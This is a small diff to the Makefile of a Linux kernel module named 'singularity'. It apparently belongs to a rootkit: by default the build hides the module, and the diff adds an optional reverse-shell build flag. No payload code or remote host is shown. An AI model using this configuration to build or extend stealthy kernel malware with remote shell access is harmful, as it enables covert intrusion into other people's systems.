@@ -1,9 +1,15 @@
 obj-m += singularity.o
 
+MODE_DEFS =
+
 # essentially a debug mode
 ifdef DONT_HIDE
 else
-	MODE_DEFS = -DHIDE_MODULE=1
+	MODE_DEFS += -DHIDE_MODULE=1
+endif
+
+ifdef REVSHELL
+	MODE_DEFS += -DREVSHELL=1
 endif
 
 ccflags-y := -std=gnu99 \
